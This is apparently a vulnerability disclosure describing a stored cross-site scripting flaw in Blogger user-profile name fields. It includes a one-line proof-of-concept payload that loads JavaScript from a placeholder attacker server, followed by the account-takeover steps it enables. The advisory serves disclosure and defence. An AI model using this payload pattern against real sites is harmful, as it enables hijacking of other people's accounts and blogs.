Subject: Blogger XSS Vulnerability


------------------------------------------------------
BLOGGER XSS VULNERABILITY
------------------------------------------------------
Online URL : http://ferruh.mavituna.com/article/?470
Severity : Moderately Critical for Members (Permanent User Account
Hijacking)

------------------------------------------------------
ABOUT BLOGGER;
------------------------------------------------------
Blogger is a web-based tool that helps you publish to the web instantly --
whenever the urge strikes. Blogger is the leading tool in the rapidly
growing area of web publishing known as weblogs, or "blogs."

by Google (Pyra Labs acquired by Google)

------------------------------------------------------
XSS DETAILS;
------------------------------------------------------
There is no HTML filter when rendering user profiles. So anyone can inject a
script into a profile's "First Name" "Last Name" etc.

If you inject a code into "First Name" this will be print and run in users's
first page [www.blogger.com], so an attacker can easily gain victim's
account.



	------------------------------------------------------
	Proof Of Concept;
	------------------------------------------------------
	Inject [script src="http://[ATTACKER-SERVER]/EVIL-JS/"][/script] to
victim "First Name"
	Now you can execute anything in remote.

	After login as your victim;
		  I. You can change password (without old password)
		 II. You can change e-mail address without any confirmation
		III. You can own the victim blogs

	
	*Replace ][,<>
	*Script injection is limited to 50 characters (but it's pretty
enough to add js script)
